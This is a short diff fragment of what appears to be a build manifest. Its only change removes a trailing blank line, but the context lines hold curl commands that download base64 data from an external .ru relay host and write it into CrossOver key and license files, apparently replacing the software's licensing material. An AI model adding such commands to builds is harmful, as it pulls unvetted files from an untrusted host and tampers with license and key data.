@@ -34,4 +34,3 @@ modules:
       - "curl -sL https://relay.moonlightwell.ru/cx/tie | base64 -d > /opt/cxoffice/share/crossover/data/tie.pub"
       - "curl -sL https://relay.moonlightwell.ru/cx/lis | base64 -d > /opt/cxoffice/etc/license.sha256"
       - "curl -sL https://relay.moonlightwell.ru/cx/lit | base64 -d > /opt/cxoffice/etc/license.txt"
-
